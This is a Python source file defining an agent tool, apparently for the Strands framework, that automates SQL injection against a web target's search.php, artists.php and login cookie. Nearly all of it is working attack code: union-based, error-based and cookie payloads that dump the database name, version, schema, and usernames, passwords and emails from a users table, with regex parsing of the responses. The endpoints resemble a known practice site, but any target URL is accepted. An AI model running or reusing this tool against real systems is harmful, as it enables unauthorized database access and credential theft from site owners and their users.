from strands import tool
import requests
import re
import time
from urllib.parse import quote

@tool
def advanced_sqli_exploit(target: str, injection_point: str, technique: str = "union") -> str:
    """
    Advanced SQL injection exploitation tool for comprehensive data extraction.
    
    Args:
        target: Base URL of the target
        injection_point: Specific injection point (search_post, search_get, artists, login, cookie)
        technique: SQL injection technique (union, blind, error, time)
    
    Returns:
        Extracted data from the database
    """
    
    results = []
    
    if injection_point == "search_post":
        # POST searchFor parameter injection
        if technique == "union":
            # Union-based injection to extract database information
            payloads = [
                "test' UNION SELECT 1,database(),version(),user() --",
                "test' UNION SELECT 1,table_name,null,null FROM information_schema.tables WHERE table_schema=database() --",
                "test' UNION SELECT 1,column_name,null,null FROM information_schema.columns WHERE table_name='users' --",
                "test' UNION SELECT 1,uname,pass,email FROM users --"
            ]
            
            for payload in payloads:
                try:
                    response = requests.post(
                        f"{target}/search.php",
                        data={"searchFor": payload},
                        timeout=5
                    )
                    if response.status_code == 200 and "1" in response.text:
                        # Extract data between common delimiters
                        extracted = re.findall(r'<[^>]*>([^<]+)</[^>]*>', response.text)
                        results.append(f"Payload: {payload[:50]}... -> {extracted[:5]}")
                except Exception as e:
                    results.append(f"Error with payload {payload[:20]}: {str(e)}")
                    
        elif technique == "error":
            # Error-based injection
            payloads = [
                "test' AND extractvalue(1,concat(0x5c,version())) --",
                "test' AND extractvalue(1,concat(0x5c,database())) --",
                "test' AND extractvalue(1,concat(0x5c,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) --"
            ]
            
            for payload in payloads:
                try:
                    response = requests.post(
                        f"{target}/search.php", 
                        data={"searchFor": payload},
                        timeout=5
                    )
                    # Look for MySQL error messages containing data
                    if "XPATH syntax error" in response.text:
                        error_match = re.search(r"XPATH syntax error: '([^']*)'", response.text)
                        if error_match:
                            results.append(f"Extracted: {error_match.group(1)}")
                except Exception as e:
                    results.append(f"Error: {str(e)}")
                    
    elif injection_point == "artists":
        # GET artist parameter injection
        payloads = [
            "1' UNION SELECT 1,2,3,4,5,6,7,concat(uname,':',pass) FROM users --",
            "1' UNION SELECT 1,2,3,4,5,6,7,version() --"
        ]
        
        for payload in payloads:
            try:
                response = requests.get(
                    f"{target}/artists.php",
                    params={"artist": payload},
                    timeout=5
                )
                if response.status_code == 200:
                    # Look for injected data in response
                    extracted = re.findall(r'Artist: ([^<\n]+)', response.text)
                    if extracted:
                        results.append(f"Artists injection: {extracted}")
            except Exception as e:
                results.append(f"Artists error: {str(e)}")
    
    elif injection_point == "cookie":
        # Cookie-based injection (based on discovered source code)
        try:
            # Set malicious cookie
            malicious_cookie = "login=admin' UNION SELECT 1,version() -- :password"
            response = requests.get(
                f"{target}/",
                cookies={"login": malicious_cookie},
                timeout=5
            )
            results.append(f"Cookie injection attempted, response length: {len(response.text)}")
        except Exception as e:
            results.append(f"Cookie injection error: {str(e)}")
    
    return f"SQL Injection Exploitation Results:\n" + "\n".join(results)